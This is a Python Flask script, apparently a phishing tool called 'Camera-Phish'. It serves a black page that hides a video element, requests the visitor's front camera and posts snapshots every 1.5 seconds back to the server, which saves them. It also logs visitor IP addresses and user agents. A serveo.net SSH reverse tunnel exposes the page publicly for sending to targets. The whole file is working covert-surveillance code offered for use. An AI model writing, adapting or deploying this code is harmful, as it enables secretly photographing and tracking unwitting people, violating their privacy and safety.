import os
import subprocess
import base64
from flask import Flask, render_template_string, request
from threading import Thread
from datetime import datetime

app = Flask(__name__)

# Directory to save images (Downloads/Camera-Phish)
DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Camera-Phish')

# Ensure the Camera-Phish folder exists
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)

# IP Log File
IP_LOG_FILE = os.path.join(DOWNLOAD_FOLDER, 'ip.txt')

# Variable to store the Serveo link
serveo_link = ""

@app.route('/')
def index():
    return render_template_string('''
    <!doctype html>
    <html>
    <head>
        <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
        <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    </head>
    
    <body style="background-color: black; color: black;">
        <div class="video-wrap" hidden="hidden">
            <video id="video" playsinline autoplay></video>
        </div>
    
        <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
    
        <script>
            function post(imgdata) {
                $.ajax({
                    type: 'POST',
                    data: { cat: imgdata },
                    url: '/post',
                    dataType: 'json',
                    async: false,
                    success: function(result) {
                        console.log("Image posted successfully");
                        window.location.href = '/redirect';  // Redirect after successful image post
                    },
                    error: function() {
                        console.error("Error posting image data.");
                    }
                });
            };

            'use strict';

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            const constraints = {
                audio: false,
                video: { facingMode: "user" }  // Use the user-facing camera
            };

            async function init() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    handleSuccess(stream);
                } catch (err) {
                    alert("Unable to access camera: " + err.message); // Alert the user
                }
            }

            // Success
            function handleSuccess(stream) {
                window.stream = stream;
                video.srcObject = stream;

                var context = canvas.getContext('2d');
                setInterval(function() {
                    context.drawImage(video, 0, 0, 640, 480);
                    var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                    post(canvasData);
                }, 1500);
            }

            // Load init
            init();
        </script>
    </body>
    </html>
    ''')

@app.route('/post', methods=['POST'])
def post():
    image_data = request.form.get('cat')
    if image_data:
        # Process the image data
        date_str = datetime.now().strftime('%d%m%Y%H%M%S')
        image_data = image_data.split(",")[1]  # Get only the base64 part
        unencoded_data = base64.b64decode(image_data)  # Decode base64 data
        image_file = os.path.join(DOWNLOAD_FOLDER, f'cam_{date_str}.png')

        # Save the image
        with open(image_file, 'wb') as f:
            f.write(unencoded_data)

        print(f"Image saved: {image_file}")
        return "Image saved!", 200

    return "No image data received.", 400

@app.route('/log_ip', methods=['GET'])
def log_ip():
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    with open(IP_LOG_FILE, 'a') as f:
        f.write(f"IP: {ip_address}\nUser-Agent: {user_agent}\n")
    return "IP logged", 200

@app.route('/redirect')
def redirect_to_page():
    return render_template_string('''
    <!doctype html>
    <html>
    <head>
        <title>Redirecting...</title>
    </head>
    <body>
        <h2>Image has been captured and saved!</h2>
        <p>Redirecting back to the camera...</p>
        <script>
            setTimeout(function() {
                window.location.href = '/';  // Redirect back to the main page
            }, 2000);  // Wait 2 seconds before redirecting
        </script>
    </body>
    </html>
    ''')

def run_flask():
    app.run(host='0.0.0.0', port=4040)  # Change the port to 4040

def start_serveo_tunnel(port):
    global serveo_link
    serveo_command = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"
    try:
        process = subprocess.Popen(serveo_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            output = process.stdout.readline()
            if output == b"" and process.poll() is not None:
                break
            if output:
                line = output.decode('utf-8').strip()
                if "https://" in line:
                    serveo_link = line  # Store the Serveo link
                    print(f"Serveo tunnel started. Access the application via: {line}")
                    break
    except Exception as e:
        print(f"Error starting Serveo tunnel: {e}")

def stop_other_processes(port):
    # Stop any process using the specified port
    os.system(f'fuser -k {port}/tcp')

def main():
    port = 4040  # Port number
    stop_other_processes(port)  # Ensure no other processes are using port 4040

    # Start the Flask server in a separate thread
    Thread(target=run_flask).start()
    
    # Start the Serveo server
    start_serveo_tunnel(port)

if __name__ == '__main__':
    main()
